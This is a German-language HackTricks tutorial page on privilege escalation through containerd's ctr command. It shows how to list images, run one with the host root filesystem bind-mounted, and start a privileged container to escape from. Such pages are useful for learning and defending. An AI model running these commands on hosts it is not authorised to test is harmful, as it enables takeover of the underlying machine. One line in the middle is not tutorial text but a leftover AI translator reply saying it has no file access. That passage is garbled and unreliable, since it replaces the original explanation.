# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Gehe zu folgendem Link, um zu erfahren, **wo `containerd` und `ctr` in den Container-Stack eingeordnet sind**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Wenn du feststellst, dass ein Host den Befehl `ctr` enthält:
```bash
which ctr
/usr/bin/ctr
```
Ich habe keinen Zugriff auf dein Dateisystem. Bitte füge hier den Inhalt von src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md ein (oder nur die betreffenden Abschnitte), dann liste ich die Bilder auf und übersetze den relevanten Text ins Deutsche wie gewünscht.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Und dann **starte eines dieser Images, indem du das Root-Verzeichnis des Hosts darin einhängst**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Starte einen privileged Container und entkomme daraus.\
Du kannst einen privileged Container wie folgt starten:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Dann kannst du einige der auf der folgenden Seite genannten Techniken verwenden, um **daraus zu entkommen, indem du privilegierte Capabilities missbrauchst**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
